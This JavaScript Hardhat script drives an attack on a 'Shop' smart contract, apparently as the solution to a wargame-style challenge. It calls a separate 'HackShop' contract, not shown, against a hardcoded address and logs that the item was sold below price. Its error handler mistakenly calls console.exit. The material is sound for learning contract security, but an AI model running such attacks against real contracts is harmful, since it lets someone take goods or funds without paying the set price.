const { ethers, network, getNamedAccounts } = require("hardhat")
const { developmentChains } = require("../helper-hardhat-config")

async function hack() {
    let shop

    if (developmentChains.includes(network.name)) {
        shop = await ethers.getContract("Shop")
    } else {
        shop = await ethers.getContractAt("Shop", "0x3f725d6B6d40710c7A8fcb551657fF37d3Ff771b")
    }

    const hackShop = await ethers.getContract("HackShop")

    console.log(`isSold ${await shop.isSold()}`)

    const tx = await hackShop.hack(shop.address)
    await tx.wait(1)
    const price = await shop.price()
    console.log(`Selling price was ${price}`)
    console.log(`isSold ${await shop.isSold()}`)
}

hack()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        console.exit(1)
    })
